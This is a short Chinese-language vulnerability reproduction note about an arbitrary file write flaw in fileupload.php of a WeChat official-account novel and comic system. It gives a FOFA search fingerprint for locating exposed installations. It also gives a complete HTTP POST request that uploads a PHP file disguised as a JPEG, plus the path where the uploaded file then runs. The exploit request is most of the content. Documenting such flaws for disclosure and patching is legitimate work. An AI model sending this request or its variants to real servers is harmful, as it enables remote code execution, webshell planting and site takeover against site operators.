# 微信公众号小说漫画系统fileupload.php存在任意文件写入漏洞

# 一、漏洞简介
微信公众号小说漫画系统前台任意文件写入漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

# 二、影响版本
+ 微信公众号小说漫画系统

# 三、资产测绘
+ fofa`"/Public/home/mhjs/jquery.js"`
+ 特征

![1728355919795-a0aaf6bf-ee63-459d-998f-cf682a606504.png](./img/h9AsBQFbBcBeN3KH/1728355919795-a0aaf6bf-ee63-459d-998f-cf682a606504-839533.png)

# 四、漏洞复现
```java
POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAW4kl2MUmkWNAgBW
Cookie: PHPSESSID=bf13e78oe1uqp8nh3crld1gu55; curIndex=3; uloginid=586639
Host: 
Origin: http://127.0.0.1
Pragma: no-cache
Referer: http://127.0.0.1/Public/webuploader/0.1.5/server/fileupload.php
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```

![1728355990707-baedf5e1-b865-479c-903d-403c1ca429a2.png](./img/h9AsBQFbBcBeN3KH/1728355990707-baedf5e1-b865-479c-903d-403c1ca429a2-058538.png)

```java
/Public/webuploader/0.1.5/server/upload/1.php
```

![1728355944065-0efedece-c38f-4038-beea-49bfae18cda9.png](./img/h9AsBQFbBcBeN3KH/1728355944065-0efedece-c38f-4038-beea-49bfae18cda9-113841.png)



> 更新: 2024-10-22 09:36:08  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ogfflvncv70d9ms4>